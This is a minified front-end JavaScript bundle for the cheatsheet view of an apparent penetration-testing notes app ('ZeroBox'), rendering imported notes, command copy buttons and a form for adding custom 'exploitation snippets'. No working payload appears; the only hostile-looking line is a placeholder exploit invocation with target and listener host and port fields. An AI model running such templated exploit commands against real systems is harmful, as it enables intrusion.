h-2.5"}),e.jsx("span",{children:Ye?"Copied":"Copy"})]})]},ge)})})]})})]},t.id)})})]})})}),T==="grouped"&&e.jsx("div",{className:"space-y-4",children:P.length===0?e.jsxs("div",{className:"p-8 sm:p-12 text-center rounded-2xl border-2 border-dashed border-purple-300 dark:border-purple-500/40 bg-purple-50/90 dark:bg-purple-950/20 space-y-4 max-w-xl mx-auto my-8 shadow-sm dark:shadow-[0_0_40px_rgba(168,85,247,0.1)]",children:[e.jsx("div",{className:"w-16 h-16 rounded-full bg-purple-100 dark:bg-purple-500/10 border border-purple-300 dark:border-purple-500/30 flex items-center justify-center mx-auto text-purple-600 dark:text-purple-400",children:e.jsx(K,{className:"w-8 h-8"})}),e.jsxs("div",{className:"space-y-1",children:[e.jsx("h3",{className:"text-base font-bold text-slate-900 dark:text-white tracking-wide",children:"Private Local-First Field Manual Vault"}),e.jsx("p",{className:"text-xs text-slate-700 dark:text-purple-200/80 font-medium leading-relaxed",children:"ZeroBox keeps notes 100% private. Notes are never bundled or published online. Import your personal Obsidian vault export to access your offensive playbooks, methodologies, and commands offline."})]}),e.jsx("div",{className:"pt-2",children:e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),Z(!0)},className:"px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-xl text-xs font-mono shadow-lg shadow-purple-600/30 transition-all inline-flex items-center gap-2 cursor-pointer",children:[e.jsx(Pe,{className:"w-4 h-4"}),e.jsx("span",{children:"Import Your Notes Vault (.json)"})]})}),e.jsxs("div",{className:"text-[11px] text-slate-600 dark:text-cyber-muted font-mono flex items-center justify-center gap-1.5 pt-1",children:[e.jsx(yt,{className:"w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400"}),e.jsx("span",{children:"IndexedDB Browser Sandbox · 0 Network Calls · 0 Data Leakage"})]})]}):ht.length===0?e.jsxs("div",{className:"p-8 text-center rounded-xl border border-dashed border-purple-200 dark:border-cyber-border bg-purple-50/50 dark:bg-cyber-card/50 text-slate-600 dark:text-cyber-muted text-xs",children:['No field manual notes matching "',ye,'".']}):ht.map(t=>{const s=!!G[t.group];return e.jsxs("div",{className:"rounded-xl border border-purple-500/30 bg-cyber-card overflow-hidden shadow-md",children:[e.jsxs("button",{type:"button",onClick:()=>Q(l=>({...l,[t.group]:!l[t.group]})),className:"w-full p-3 bg-purple-950/30 hover:bg-purple-900/40 border-b border-purple-900/30 flex items-center justify-between text-xs transition-colors",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[s?e.jsx(et,{className:"w-4 h-4 text-purple-400"}):e.jsx(He,{className:"w-4 h-4 text-purple-400"}),e.jsxs("span",{className:"font-bold text-slate-900 dark:text-white text-sm",children:["📁 ",t.group]}),e.jsxs("span",{className:"text-[10px] font-mono px-2 py-0.5 rounded bg-slate-200 dark:bg-black/40 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300",children:[t.count," notes"]})]}),e.jsx("span",{className:"text-[11px] text-cyber-muted font-mono",children:s?"Click to expand":"Click to collapse"})]}),!s&&e.jsx("div",{className:"p-3 space-y-3",children:t.notes.map(l=>{const O=!!st[l.id]?l.commands:l.commands?l.commands.slice(0,2):[];l.commands&&Math.max(0,l.commands.length-2);const be=ue==="rtl"||ue==="auto"&&y==="he",q=De===l.id;return e.jsxs("div",{id:`cpts-note-${l.id}`,dir:be?"rtl":"ltr",className:`p-3.5 rounded-xl border border-cyber-border bg-cyber-bg/40 hover:border-purple-500/50 hover:shadow-lg transition-all space-y-2.5 group ${be?"text-right":"text-left"} ${q?"ring-2 ring-purple-400 bg-purple-950/30":""}`,children:[e.jsxs("div",{className:"flex items-start justify-between gap-3",children:[e.jsxs("div",{className:"space-y-1 flex-1 min-w-0",children:[e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(l)},className:"font-bold text-slate-900 dark:text-white text-xs group-hover:text-purple-600 dark:group-hover:text-purple-300 transition-colors cursor-pointer inline-flex items-center gap-1.5",title:y==="he"?"פתח הערה באובסידיאן":"Open authentic Obsidian note",dir:y==="he"?"rtl":"ltr",children:[e.jsx(K,{className:"w-3 h-3 text-purple-400 flex-shrink-0"}),e.jsx("span",{children:y==="he"?l.titleHe||l.title:l.titleEn||l.title})]}),e.jsx("p",{className:`text-[11px] text-cyber-muted line-clamp-2 ${y==="he"?"font-sans text-right":"text-left"}`,dir:y==="he"?"rtl":"ltr",children:y==="he"?l.heSummary||l.summary||l.subCategory:l.enSummary||l.summary||l.subCategory})]}),e.jsxs("div",{className:"flex items-center gap-1.5 flex-shrink-0",children:[e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(l)},className:"px-2 py-1 rounded text-[10px] font-semibold bg-purple-100 dark:bg-purple-950/60 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:bg-purple-200 dark:hover:bg-purple-900/80 transition-all flex items-center gap-1 cursor-pointer",title:"Open Obsidian personal note",children:[e.jsx(K,{className:"w-2.5 h-2.5"}),e.jsx("span",{children:"Note"})]}),l.commands&&l.commands.length>0&&e.jsxs("button",{type:"button",onClick:()=>ze(l),className:"px-2 py-1 rounded text-[10px] font-semibold bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-purple-900 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:border-purple-400 transition-all flex items-center gap-1 cursor-pointer",children:[e.jsx(ce,{className:"w-3 h-3"}),e.jsxs("span",{children:["Copy All (",l.commands.length,")"]})]}),e.jsx("button",{type:"button",onClick:()=>Fe(l.id,l.titleEn||l.title),className:"p-1 rounded text-cyber-muted hover:text-cyber-crimson hover:bg-rose-950/40 border border-cyber-border hover:border-rose-900/50 transition-all cursor-pointer",title:"Delete field note",children:e.jsx(Se,{className:"w-3 h-3"})})]})]}),O&&O.length>0&&e.jsx("div",{className:"space-y-1 pt-1 text-left",dir:"ltr",children:O.map((xe,ge)=>{const ke=fe(xe,g);return e.jsx("div",{className:"p-1.5 px-2 rounded bg-cyber-code border border-cyber-border text-xs font-mono text-cyber-cyan truncate select-all",children:ke},ge)})})]},l.id)})})]},t.group)})}),T==="cards"&&e.jsx("div",{className:"space-y-3",children:P.length===0?e.jsxs("div",{className:"p-8 sm:p-12 text-center rounded-2xl border-2 border-dashed border-purple-300 dark:border-purple-500/40 bg-purple-50/90 dark:bg-purple-950/20 space-y-4 max-w-xl mx-auto my-8 shadow-sm dark:shadow-[0_0_40px_rgba(168,85,247,0.1)]",children:[e.jsx("div",{className:"w-16 h-16 rounded-full bg-purple-100 dark:bg-purple-500/10 border border-purple-300 dark:border-purple-500/30 flex items-center justify-center mx-auto text-purple-600 dark:text-purple-400",children:e.jsx(K,{className:"w-8 h-8"})}),e.jsxs("div",{className:"space-y-1",children:[e.jsx("h3",{className:"text-base font-bold text-slate-900 dark:text-white tracking-wide",children:"Private Local-First Field Manual Vault"}),e.jsx("p",{className:"text-xs text-slate-700 dark:text-purple-200/80 font-medium leading-relaxed",children:"ZeroBox keeps notes 100% private. Notes are never bundled or published online. Import your personal Obsidian vault export to access your offensive playbooks, methodologies, and commands offline."})]}),e.jsx("div",{className:"pt-2",children:e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),Z(!0)},className:"px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-xl text-xs font-mono shadow-lg shadow-purple-600/30 transition-all inline-flex items-center gap-2 cursor-pointer",children:[e.jsx(Pe,{className:"w-4 h-4"}),e.jsx("span",{children:"Import Your Notes Vault (.json)"})]})}),e.jsxs("div",{className:"text-[11px] text-slate-600 dark:text-cyber-muted font-mono flex items-center justify-center gap-1.5 pt-1",children:[e.jsx(yt,{className:"w-3.5 h-3.5 text-emerald-600 dark:text-emerald-400"}),e.jsx("span",{children:"IndexedDB Browser Sandbox · 0 Network Calls · 0 Data Leakage"})]})]}):ve.length===0?e.jsxs("div",{className:"p-8 text-center rounded-xl border border-dashed border-purple-200 dark:border-cyber-border bg-purple-50/50 dark:bg-cyber-card/50 text-slate-600 dark:text-cyber-muted text-xs",children:['No field manual notes matching "',ye,'".']}):ve.map(t=>{const s=!!st[t.id],l=s?t.commands:t.commands?t.commands.slice(0,2):[],_=t.commands?Math.max(0,t.commands.length-2):0,O=ue==="rtl"||ue==="auto"&&y==="he",be=De===t.id;return e.jsxs("div",{id:`cpts-note-${t.id}`,dir:O?"rtl":"ltr",className:`p-4 rounded-xl border border-cyber-border bg-cyber-card hover:border-purple-500/50 hover:shadow-lg transition-all space-y-3 group ${O?"text-right":"text-left"} ${be?"ring-2 ring-purple-400 bg-purple-950/30":""}`,children:[e.jsxs("div",{className:"flex items-start justify-between gap-3",children:[e.jsxs("div",{className:"space-y-2 flex-1 min-w-0",children:[y==="he"?e.jsx("div",{className:"text-right",dir:"rtl",children:e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(t)},className:"font-bold text-slate-900 dark:text-white text-sm group-hover:text-purple-600 dark:group-hover:text-purple-300 transition-colors font-sans cursor-pointer inline-flex items-center gap-1.5",title:"פתח רשימות אישיות מקיפות",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-600 dark:text-purple-400 flex-shrink-0"}),e.jsx("span",{children:t.titleHe||t.title}),Ne(t)&&e.jsxs("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-amber-100 text-amber-800 dark:bg-amber-500/15 dark:text-amber-300 border border-amber-300 dark:border-amber-500/30 font-mono font-bold",children:["#",Ne(t)]})]})}):e.jsx("div",{children:e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(t)},className:"font-bold text-slate-900 dark:text-white text-sm group-hover:text-purple-600 dark:group-hover:text-purple-300 transition-colors text-left cursor-pointer inline-flex items-center gap-1.5",title:"Open authentic Obsidian note",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-600 dark:text-purple-400 flex-shrink-0"}),e.jsx("span",{children:t.titleEn||t.title}),Ne(t)&&e.jsxs("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-amber-100 text-amber-800 dark:bg-amber-500/15 dark:text-amber-300 border border-amber-300 dark:border-amber-500/30 font-mono font-bold",children:["#",Ne(t)]})]})}),e.jsxs("div",{className:"flex items-center gap-1.5 flex-wrap",children:[t.stage&&e.jsxs("span",{className:"text-[9px] px-2 py-0.5 rounded bg-blue-100 dark:bg-blue-500/15 text-blue-800 dark:text-blue-300 border border-blue-300 dark:border-blue-500/30 font-mono font-semibold",children:["🎯 Stage: ",t.stage]}),e.jsx("span",{className:"text-[9px] px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-500/15 text-purple-800 dark:text-purple-300 border border-purple-300 dark:border-purple-500/30 font-mono",children:t.category}),t.subCategory&&e.jsxs("span",{className:"text-[9px] px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-950/40 text-purple-800 dark:text-purple-300 border border-purple-300 dark:border-purple-800/40 font-mono",children:["📁 ",Ae(t.subCategory).group]}),e.jsx("span",{className:"text-[9px] px-2 py-0.5 rounded bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-slate-700 dark:text-cyber-muted font-mono",children:t.difficulty}),t.tools&&t.tools.map(q=>e.jsxs("span",{className:"text-[9px] px-1.5 py-0.5 rounded bg-emerald-100 dark:bg-emerald-500/15 text-emerald-800 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-500/30 font-mono",children:["🔧 ",q]},q))]}),y==="he"?e.jsx("div",{className:"text-[11px] text-purple-900 dark:text-purple-200/90 leading-relaxed font-sans text-right",dir:"rtl",children:t.heSummary||t.summary||t.subCategory}):e.jsx("div",{className:"text-[11px] text-slate-600 dark:text-cyber-muted leading-relaxed font-sans text-left",dir:"ltr",children:t.enSummary||t.summary||t.subCategory}),t.tags&&t.tags.length>0&&e.jsx("div",{className:"flex flex-wrap gap-1 pt-0.5",children:t.tags.map(q=>e.jsxs("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border/70 text-cyber-cyan",children:["#",q]},q))})]}),e.jsxs("div",{className:"flex items-center gap-1.5 flex-shrink-0",children:[e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(t)},className:"flex items-center gap-1.5 px-2.5 py-1 rounded text-xs font-semibold bg-purple-100 dark:bg-purple-950/60 border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:bg-purple-200 dark:hover:bg-purple-900/80 hover:border-purple-400 transition-all cursor-pointer shadow-sm",title:"Open full authentic Obsidian personal note",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"Open Note"})]}),t.commands&&t.commands.length>1&&e.jsx("button",{type:"button",onClick:()=>ze(t),className:`flex items-center gap-1.5 px-2.5 py-1 rounded text-xs font-semibold flex-shrink-0 transition-all cursor-pointer ${we===`all-${t.id}`?"bg-cyber-emerald/20 text-cyber-emerald border border-cyber-emerald shadow-glow-emerald/30":"bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-purple-900 dark:text-purple-300 hover:border-purple-400 hover:text-purple-950 dark:hover:text-white"}`,title:"Copy all commands in this note to clipboard",children:we===`all-${t.id}`?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3.5 h-3.5 text-cyber-emerald"}),e.jsx("span",{children:"All Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(ce,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["Copy All (",t.commands.length,")"]})]})}),e.jsx("button",{type:"button",onClick:()=>Fe(t.id,t.titleEn||t.title),className:"p-1.5 rounded text-cyber-muted hover:text-cyber-crimson hover:bg-rose-950/40 border border-cyber-border hover:border-rose-900/50 transition-all cursor-pointer",title:"Delete field note",children:e.jsx(Se,{className:"w-3.5 h-3.5"})})]})]}),t.commands&&t.commands.length>0&&e.jsxs("div",{className:"space-y-2 pt-1 border-t border-cyber-border/60 text-left",dir:"ltr",children:[l.map((q,xe)=>{const ge=fe(q,g),ke=`${t.id}-${xe}`,Te=we===ke;return e.jsxs("div",{className:"flex items-center justify-between gap-2 p-2 rounded bg-cyber-code border border-cyber-border group-hover:border-purple-900/40 text-xs font-mono",children:[e.jsx("pre",{className:"text-cyber-cyan overflow-x-auto whitespace-pre-wrap break-all flex-1 select-all",title:ge,children:ge}),e.jsx("button",{type:"button",onClick:()=>Ee(ge,ke),className:`flex items-center gap-1 px-2 py-0.5 rounded text-[11px] font-semibold flex-shrink-0 transition-all ${Te?"bg-cyber-emerald/20 text-cyber-emerald border border-cyber-emerald shadow-glow-emerald/30":"bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-cyber-cyan"}`,children:Te?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3 h-3 text-cyber-emerald"}),e.jsx("span",{children:"Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(ce,{className:"w-3 h-3"}),e.jsx("span",{children:"Copy"})]})})]},xe)}),_>0&&e.jsx("button",{type:"button",onClick:()=>Ct(q=>({...q,[t.id]:!q[t.id]})),className:"text-[10px] text-purple-400 hover:text-purple-300 font-bold flex items-center gap-1 pt-1",children:s?e.jsxs(e.Fragment,{children:[e.jsx(mr,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Collapse Extra Commands"})]}):e.jsxs(e.Fragment,{children:[e.jsx(He,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["+ View ",_," more command",_>1?"s":""," from this note"]})]})})]})]},t.id)})}),ve.length<J.length&&e.jsxs("div",{className:"p-4 rounded-xl border border-cyber-border bg-cyber-card flex flex-wrap items-center justify-center gap-3",children:[e.jsxs("button",{type:"button",onClick:()=>ae(t=>t+30),className:"px-5 py-2 rounded-lg bg-purple-500/20 border border-purple-500/50 hover:bg-purple-500 hover:text-black text-purple-300 font-bold text-xs transition-all shadow-md flex items-center gap-2",children:[e.jsx(ur,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["LOAD NEXT 30 NOTES (",J.length-ve.length," REMAINING)"]})]}),e.jsxs("button",{type:"button",onClick:()=>ae(J.length),className:"px-4 py-2 rounded-lg bg-cyber-bg border border-cyber-border hover:border-white text-cyber-muted hover:text-white text-xs font-semibold transition-all",children:["SHOW ALL (",J.length,")"]})]})]})]})]}),Tt&&e.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-fade-in",children:e.jsxs(re.div,{initial:{opacity:0,scale:.95},animate:{opacity:1,scale:1},className:"w-full max-w-lg rounded-xl border border-cyber-border bg-cyber-card shadow-2xl p-5 space-y-4",children:[e.jsxs("h3",{className:"text-base font-bold text-white flex items-center gap-2",children:[e.jsx(xr,{className:"w-4 h-4 text-cyber-cyan"})," ADD CUSTOM EXPLOITATION SNIPPET"]}),e.jsxs("form",{onSubmit:_t,className:"space-y-3 text-xs",children:[e.jsxs("div",{children:[e.jsx("label",{htmlFor:"custom-snippet-title",className:"block text-cyber-muted uppercase tracking-wider mb-1 font-semibold",children:"Command Title *"}),e.jsx("input",{type:"text",id:"custom-snippet-title",name:"custom-snippet-title",required:!0,value:Ue,onChange:t=>ot(t.target.value),placeholder:"e.g. Chamilo LMS RCE Exploit",className:"w-full bg-cyber-bg px-3 py-2 rounded-lg border border-cyber-border text-white focus:outline-none focus:border-cyber-cyan"})]}),e.jsxs("div",{children:[e.jsx("label",{htmlFor:"custom-snippet-category",className:"block text-cyber-muted uppercase tracking-wider mb-1 font-semibold",children:"Category"}),e.jsx(Ze,{id:"custom-snippet-category",name:"custom-snippet-category",value:lt,onChange:Pt,options:_r,variant:"default",size:"md",className:"w-full",triggerClassName:"w-full bg-cyber-bg"})]}),e.jsxs("div",{children:[e.jsx("label",{htmlFor:"custom-snippet-desc",className:"block text-cyber-muted uppercase tracking-wider mb-1 font-semibold",children:"Description"}),e.jsx("input",{type:"text",id:"custom-snippet-desc",name:"custom-snippet-desc",value:it,onChange:t=>ct(t.target.value),placeholder:"Brief note on exploit parameters...",className:"w-full bg-cyber-bg px-3 py-2 rounded-lg border border-cyber-border text-white focus:outline-none focus:border-cyber-cyan"})]}),e.jsxs("div",{children:[e.jsx("label",{htmlFor:"custom-snippet-template",className:"block text-cyber-muted uppercase tracking-wider mb-1 font-semibold",children:"Command Template (Supports {TARGET_IP}, {LHOST}, {LPORT}) *"}),e.jsx("textarea",{id:"custom-snippet-template",name:"custom-snippet-template",rows:3,required:!0,value:Ve,onChange:t=>dt(t.target.value),placeholder:"python3 exploit.py -t {TARGET_IP} -l {LHOST} -p {LPORT}",className:"w-full bg-cyber-bg px-3 py-2 rounded-lg border border-cyber-border text-white focus:outline-none focus:border-cyber-cyan font-mono resize-none"})]}),e.jsxs("div",{children:[e.jsx("label",{htmlFor:"custom-snippet-tags",className:"block text-cyber-muted uppercase tracking-wider mb-1 font-semibold",children:"Tags (Comma-separated)"}),e.jsx("input",{type:"text",id:"custom-snippet-tags",name:"custom-snippet-tags",value:pt,onChange:t=>mt(t.target.value),placeholder:"rce, python, cve-2023-xxxx",className:"w-full bg-cyber-bg px-3 py-2 rounded-lg border border-cyber-border text-white focus:outline-none focus:border-cyber-cyan"})]}),e.jsxs("div",{className:"pt-2 flex items-center justify-end gap-2 border-t border-cyber-border",children:[e.jsx("button",{type:"button",onClick:()=>We(!1),className:"px-4 py-2 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white",children:"Cancel"}),e.jsx(re.button,{whileHover:{scale:1.03},whileTap:{scale:.97},type:"submit",className:"px-4 py-2 rounded-lg bg-cyber-cyan text-black font-bold hover:bg-cyber-cyan/90 transition-all shadow-glow-cyan",children:"Save Snippet"})]})]})]})}),nt&&e.jsx($r,{note:nt,globalVars:g,soundEnabled:u,onClose:()=>te(null),onNavigateToNote:t=>{const s=kt(t);s&&te(s)},onDeleteNote:t=>{oe(t),u&&p("root"),te(null)},defaultLanguage:y}),e.jsx(jr,{isOpen:r,onClose:()=>{o(!1),H(void 0)},onSave:Mt,existingDirectories:Rt,initialDirectory:S})]})};export{Hr as CheatsheetView};
